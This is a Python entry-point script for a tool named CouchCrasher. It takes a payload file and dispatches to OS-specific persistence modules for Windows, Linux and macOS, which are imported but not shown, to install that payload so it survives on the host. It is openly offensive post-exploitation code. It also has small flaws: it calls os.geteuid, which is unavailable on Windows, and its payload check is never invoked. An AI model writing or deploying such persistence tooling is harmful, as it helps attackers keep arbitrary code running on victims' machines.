"""
couchcrasher.py: Entry point for the CouchCrasher application.
"""

import os
import sys

from pathlib import Path

from support.core    import Persistence
from support.windows import WindowsPersistence
from support.linux   import LinuxPersistence
from support.macos   import MacPersistence


class CouchCrasher:
    """
    Main class for the CouchCrasher application.
    """

    def __init__(self, payload: str) -> None:
        self._payload = payload
        self._os_variants = {
            "win32":  WindowsPersistence,
            "linux":  LinuxPersistence,
            "darwin": MacPersistence,
        }

        self._effective_user_id = self._get_effective_user_id()
        self._current_os        = self._get_os()

        if self._current_os not in self._os_variants:
            raise NotImplementedError(f"OS {self._current_os} is not supported.")


    def _verify_payload(self) -> None:
        """
        Verify that the payload exists.
        """
        if not Path(self._payload).exists():
            raise FileNotFoundError(f"Payload {self._payload} does not exist.")


    def _get_os(self) -> str:
        """
        Get the current OS.
        """
        return sys.platform


    def _get_effective_user_id(self) -> int:
        """
        Get the effective user ID.
        """
        return os.geteuid()


    def run(self) -> None:
        """
        Install the payload.
        """

        persistence: Persistence = self._os_variants[self._current_os](
            payload=self._payload,
            effective_user_id=self._effective_user_id
        )

        print("Installing payload:")
        print(f"  Payload: {self._payload}")
        print(f"  OS: {self._current_os}")
        print(f"  Effective User ID: {self._effective_user_id}")
        print(f"  Persistence Method: {persistence.recommended_persistence_method()}")

        persistence.install()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <payload>")
        sys.exit(1)

    couchcrasher = CouchCrasher(payload=sys.argv[1])
    couchcrasher.run()
